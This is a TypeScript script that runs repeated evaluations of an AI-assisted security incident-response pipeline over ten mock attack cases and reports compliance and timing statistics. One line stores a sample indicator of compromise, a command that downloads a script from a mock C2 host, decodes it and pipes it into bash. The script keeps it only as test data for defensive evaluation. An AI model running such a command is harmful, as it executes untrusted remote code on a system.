/**
 * run-repeated-evaluation.ts — repeated, single-pass evaluation for paper-grade statistics (§6/§7 of the
 * evaluation plan). Each run ingests 10 FRESH alerts (unique ids) and drives each incident through
 * investigation -> AI analysis -> (analyst enrichment where a known gap needs it) -> recommendation ->
 * IR decision in ONE uninterrupted pass, so Investigation-Time and Time-to-Decision are clean latencies
 * (not polluted by manual gaps). Repeating N times yields per-case compliance pass-rate, retry mean, and
 * timing mean +/- SD. Verification is not exercised here (the three KPIs need only up to the decision).
 *
 *   npx ts-node --transpile-only scripts/run-repeated-evaluation.ts [N]   # default N=2
 */
import "dotenv/config";
import * as fs from "node:fs";
import * as path from "node:path";
import { randomUUID } from "node:crypto";
import { PrismaClient } from "@prisma/client";
import { WazuhAdapter } from "../src/infrastructure/external-services/siem/WazuhAdapter";
import { alertWorkflow } from "../src/infrastructure/database/postgres/AlertWorkflow";
import { PrismaAlertRepository } from "../src/infrastructure/database/postgres/repositories/AlertRepository.prisma";
import { PrismaIncidentRepository } from "../src/infrastructure/database/postgres/repositories/IncidentRepository.prisma";
import { PrismaInvestigationRepository } from "../src/infrastructure/database/postgres/repositories/InvestigationRepository.prisma";
import { PrismaRecommendationContextRepository } from "../src/infrastructure/database/postgres/repositories/RecommendationContextRepository.prisma";
import { PrismaActionRepository } from "../src/infrastructure/database/postgres/repositories/ActionRepository.prisma";
import { PrismaRunbookRepository } from "../src/infrastructure/database/postgres/repositories/RunbookRepository.prisma";
import { PrismaPlaybookRepository } from "../src/infrastructure/database/postgres/repositories/PlaybookRepository.prisma";
import { PrismaRecommendationRepository } from "../src/infrastructure/database/postgres/repositories/RecommendationRepository.prisma";
import { PrismaApprovalRepository } from "../src/infrastructure/database/postgres/repositories/ApprovalRepository.prisma";
import { PrismaResponsePlanRepository } from "../src/infrastructure/database/postgres/repositories/ResponsePlanRepository.prisma";
import { PrismaPolicyRepository } from "../src/infrastructure/database/postgres/repositories/PolicyRepository.prisma";
import { PrismaAiAnalysisRunGuard } from "../src/infrastructure/database/postgres/repositories/AiAnalysisRunGuard.prisma";
import { AuditLogger } from "../src/infrastructure/database/postgres/repositories/AuditLogger";
import { PolicyEvaluator } from "../src/infrastructure/policy-engine/PolicyEvaluator";
import { PolicyIncidentIntake } from "../src/infrastructure/policy-engine/PolicyIncidentIntake";
import { ApprovalService } from "../src/application/approval/services/ApprovalService";
import { ResourceAssetCriticalityProvider } from "../src/infrastructure/assets/ResourceAssetCriticalityProvider";
import { LangGraphOrchestratorAdapter } from "../src/infrastructure/ai/LangGraphOrchestratorAdapter";
import { RecommendationContextBuilder } from "../src/application/recommendation/services/RecommendationContextBuilder";
import { RecommendationValidator } from "../src/infrastructure/recommendation-validation/RecommendationValidator";
import { LlmRecommendationAgent } from "../src/infrastructure/ai/LlmRecommendationAgent";
import { GenerateRecommendationUseCase } from "../src/application/recommendation/use-cases/GenerateRecommendation.usecase";
import { IngestAlertFromSiemUseCase } from "../src/application/alert/use-cases/IngestAlertFromSiem.usecase";
import { CreateIncidentUseCase } from "../src/application/incident/use-cases/CreateIncident.usecase";
import { RunIncidentAiAnalysisUseCase } from "../src/application/incident/use-cases/RunIncidentAiAnalysis.usecase";
import { GetIncidentAiAnalysisUseCase } from "../src/application/incident/use-cases/GetIncidentAiAnalysis.usecase";
import { CreateResponsePlanUseCase } from "../src/application/response/use-cases/CreateResponsePlan.usecase";
import { DecideApprovalUseCase } from "../src/application/approval/use-cases/DecideApproval.usecase";
import { CreateIocUseCase } from "../src/application/investigation/use-cases/CreateIoc.usecase";
import { INotificationDispatcherPort } from "../src/application/notification/ports/INotificationDispatcherPort";
import { TC_GROUND_TRUTH } from "../src/evaluation/groundTruth";
import { collectEvaluationCase, knownActionCodes } from "../src/evaluation/EvaluationService";
import { EvaluationCase } from "../src/evaluation/types";

const TENANT = "00000000-0000-0000-0000-000000000001";
const AI_URL = process.env.AI_ORCHESTRATOR_URL ?? "http://localhost:8000";
const SOC = "rpt-soc", IR = "rpt-ir";
const N = Math.max(1, Number(process.argv[2] ?? 2));
const MOCK_DIR = path.join(__dirname, "..", "..", "..", "resources", "mock-attacks-tc");
const FILE_BY_RULE: Record<string, string> = {
  "5712": "TC-01-brute-force.json", "100301": "TC-02-malware.json", "100310": "TC-03-phishing.json",
  "100200": "TC-04-account-compromise.json", "100300": "TC-05-powershell.json", "31103": "TC-06-sql-injection.json",
  "100320": "TC-07-command-and-control.json", "100330": "TC-08-suspicious-process.json",
  "100340": "TC-09-data-exfiltration.json", "100350": "TC-10-privilege-escalation.json",
};

const mean = (xs: number[]) => (xs.length ? xs.reduce((a, b) => a + b, 0) / xs.length : NaN);
const sd = (xs: number[]) => { if (xs.length < 2) return 0; const m = mean(xs); return Math.sqrt(xs.reduce((a, b) => a + (b - m) ** 2, 0) / (xs.length - 1)); };
const r2 = (x: number) => Math.round(x * 100) / 100;

(async () => {
  const prisma = new PrismaClient();
  const noNotify = { emit: async () => undefined } as unknown as INotificationDispatcherPort;
  const wazuh = new WazuhAdapter();
  const alerts = new PrismaAlertRepository(prisma);
  const incidents = new PrismaIncidentRepository(prisma);
  const investigations = new PrismaInvestigationRepository(prisma);
  const ctxRepo = new PrismaRecommendationContextRepository(prisma);
  const actions = new PrismaActionRepository(prisma);
  const runbooks = new PrismaRunbookRepository(prisma);
  const playbookRepo = new PrismaPlaybookRepository(prisma);
  const recs = new PrismaRecommendationRepository(prisma);
  const approvals = new PrismaApprovalRepository(prisma);
  const plans = new PrismaResponsePlanRepository(prisma);
  const audit = new AuditLogger(prisma);
  const policy = new PolicyEvaluator(new PrismaPolicyRepository(prisma));
  const approvalService = new ApprovalService(ctxRepo, actions, policy, approvals, audit, noNotify, "http://localhost", new ResourceAssetCriticalityProvider());
  const ingest = new IngestAlertFromSiemUseCase(alerts, incidents, { enqueue: async () => { throw new Error("no queue"); }, latestForIncident: async () => null }, audit, new PolicyIncidentIntake(policy), new CreateIncidentUseCase(incidents, alerts, audit));
  const runAnalysis = new RunIncidentAiAnalysisUseCase(incidents, new PrismaAiAnalysisRunGuard(prisma), new LangGraphOrchestratorAdapter(AI_URL), investigations, new GetIncidentAiAnalysisUseCase(ctxRepo), audit);
  const generate = new GenerateRecommendationUseCase(new RecommendationContextBuilder(ctxRepo, actions, runbooks, playbookRepo, approvalService), new LlmRecommendationAgent(AI_URL), "LlmRecommendationAgent/v2.0.0", new RecommendationValidator(actions, runbooks), recs, audit);
  const createPlan = new CreateResponsePlanUseCase(recs, actions, runbooks, approvalService, plans, audit, noNotify, "http://localhost");
  const decide = new DecideApprovalUseCase(approvals, audit, recs, ctxRepo, plans, noNotify, "http://localhost");
  const createIoc = new CreateIocUseCase(investigations, audit);
  const known = await knownActionCodes(prisma);

  const alertJson = (rule: string) => JSON.parse(fs.readFileSync(path.join(MOCK_DIR, FILE_BY_RULE[rule]), "utf-8"));

  // per-TC accumulators
  const acc: Record<string, { compliant: number; evaluated: number; retries: number[]; inv: number[]; dec: number[]; interv: number }> = {};
  for (const gt of TC_GROUND_TRUTH) acc[gt.caseId] = { compliant: 0, evaluated: 0, retries: [], inv: [], dec: [], interv: 0 };

  for (let run = 1; run <= N; run++) {
    const runId = `rpt-${run}-${randomUUID().slice(0, 8)}`;
    console.log(`\n########## RUN ${run}/${N} (${runId}) ##########`);
    for (const gt of TC_GROUND_TRUTH) {
      try {
        // 1. ingest fresh alert
        const raw = alertJson(gt.ruleId);
        raw.id = `${runId}.${gt.ruleId}`;
        const norm = wazuh.normalize({ ...raw });
        const ing = await ingest.execute({ ...norm, tenantId: TENANT });
        if (ing.isFailure) { console.log(`${gt.caseId}: ingest FAIL`); continue; }
        let incidentId = ing.value.incidentId as string | null;
        // 2. SOC triage opens the incident for MEDIUM
        if (!incidentId) {
          const t = await alertWorkflow(prisma).triage.execute({ tenantId: TENANT, alertId: ing.value.alert.id, actor: SOC, decision: "CREATE_INCIDENT", reason: "repeated-run SOC review" } as never);
          incidentId = (t as any).value?.incidentId ?? null;
        }
        if (!incidentId) { console.log(`${gt.caseId}: no incident`); continue; }
        // 3. AI analysis
        await runAnalysis.execute({ tenantId: TENANT, incidentId, actor: SOC });
        // 4. analyst enrichment for the two known IOC-shape gaps (recorded as intervention)
        const inv1 = await prisma.investigation.findFirst({ where: { incidentId, investigationNumber: 1 } });
        if (gt.ruleId === "100310" && inv1) await prisma.threatIntelIoc.updateMany({ where: { incidentId, iocValue: "it-support@vigix-mock-phish.net" }, data: { createdBy: SOC } });
        if (gt.ruleId === "100330" && inv1) await createIoc.execute({ tenantId: TENANT, investigationId: inv1.id, createdBy: SOC, body: { iocType: "COMMAND", iocValue: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash", source: "analyst enrichment" } as never });
        // 5. recommendation (bounded retry for LLM variance)
        const usable = async () => (await prisma.recommendation.findMany({ where: { incidentId, status: "VALIDATED" }, include: { steps: true } })).some((r) => r.steps.some((s) => s.actionId));
        for (let i = 0; i < 3 && !(await usable()); i++) await generate.execute({ incidentId, tenantId: TENANT });
        const rec = await prisma.recommendation.findFirst({ where: { incidentId, status: "VALIDATED" }, orderBy: { recommendationNumber: "desc" }, include: { steps: true } });
        // 6. IR decision (for Time-to-Decision)
        if (rec) {
          const step = rec.steps.find((s) => s.actionId);
          if (step) {
            const p = await createPlan.execute({ recommendationId: rec.id, stepId: step.id, tenantId: TENANT });
            if (p.isSuccess) {
              let plan = p.value;
              while (plan.status === "PENDING_IR_DECISION") {
                const a = (await approvals.findByResponse(plan.id, TENANT)).find((x) => x.status === "pending");
                if (!a) break;
                await decide.execute({ approvalId: a.id, tenantId: TENANT, status: "approved", decidedBy: IR, decidedByRole: "IR_TEAM", comment: "repeated-run IR approve" });
                plan = (await plans.findById(plan.id, TENANT))!;
              }
            }
          }
        }
        // 7. score this incident (clean, same-pass timestamps)
        const c: EvaluationCase = await collectEvaluationCase(prisma, gt, known, incidentId);
        const a = acc[gt.caseId];
        if (c.recommendationCompliance !== "NOT_EVALUATED") { a.evaluated++; if (c.recommendationCompliance === "COMPLIANT") a.compliant++; }
        a.retries.push(c.invalidOutputCount);
        if (c.investigationTimeSeconds !== null) a.inv.push(c.investigationTimeSeconds);
        if (c.timeToDecisionSeconds !== null) a.dec.push(c.timeToDecisionSeconds);
        if (c.interventionRequired) a.interv++;
        console.log(`${gt.caseId}: ${c.recommendationCompliance.padEnd(14)} inv=${c.investigationTimeSeconds}s dec=${c.timeToDecisionSeconds}s retry=${c.invalidOutputCount}`);
      } catch (e) {
        console.log(`${gt.caseId}: THREW ${String((e as Error).message).slice(0, 100)}`);
      }
    }
  }

  // aggregate
  console.log(`\n================= REPEATED-RUN AGGREGATE (N=${N}) =================`);
  console.log("TC     | Compliance | Inv time (s) mean±sd | Dec time (s) mean±sd | Retry mean | Interv");
  const rows: any[] = [];
  for (const gt of TC_GROUND_TRUTH) {
    const a = acc[gt.caseId];
    const passRate = a.evaluated ? r2((a.compliant / a.evaluated) * 100) : 0;
    const row = { tc: gt.caseId, evaluated: a.evaluated, compliant: a.compliant, compliancePassRatePct: passRate,
      investigationMean: r2(mean(a.inv)), investigationSd: r2(sd(a.inv)), decisionMean: r2(mean(a.dec)), decisionSd: r2(sd(a.dec)),
      retryMean: r2(mean(a.retries)), interventionRuns: a.interv, runs: N };
    rows.push(row);
    console.log(`${gt.caseId.padEnd(6)} | ${String(passRate + "% (" + a.compliant + "/" + a.evaluated + ")").padEnd(10)} | ${String(r2(mean(a.inv)) + " ± " + r2(sd(a.inv))).padEnd(20)} | ${String(r2(mean(a.dec)) + " ± " + r2(sd(a.dec))).padEnd(20)} | ${String(r2(mean(a.retries))).padEnd(10)} | ${a.interv}/${N}`);
  }
  const allInv = rows.flatMap((r) => acc[r.tc].inv), allDec = rows.flatMap((r) => acc[r.tc].dec);
  const overall = {
    runs: N,
    overallCompliancePassRatePct: r2((rows.reduce((s, r) => s + r.compliant, 0) / rows.reduce((s, r) => s + r.evaluated, 0)) * 100),
    investigationTimeMean: r2(mean(allInv)), investigationTimeSd: r2(sd(allInv)),
    decisionTimeMean: r2(mean(allDec)), decisionTimeSd: r2(sd(allDec)),
    interventionCasesPerRun: r2(rows.reduce((s, r) => s + r.interventionRuns, 0) / N),
  };
  console.log("\nOVERALL:", JSON.stringify(overall, null, 2));

  const OUT = path.join(__dirname, "eval-out");
  fs.mkdirSync(OUT, { recursive: true });
  fs.writeFileSync(path.join(OUT, `repeated-evaluation-N${N}.json`), JSON.stringify({ generatedAt: new Date().toISOString(), runs: N, overall, perCase: rows }, null, 2));
  console.log(`\nExported: ${path.join(OUT, `repeated-evaluation-N${N}.json`)}`);
  await prisma.$disconnect();
})().catch((e) => { console.error("repeated eval crashed:", String(e?.stack ?? e).slice(0, 800)); process.exit(2); });
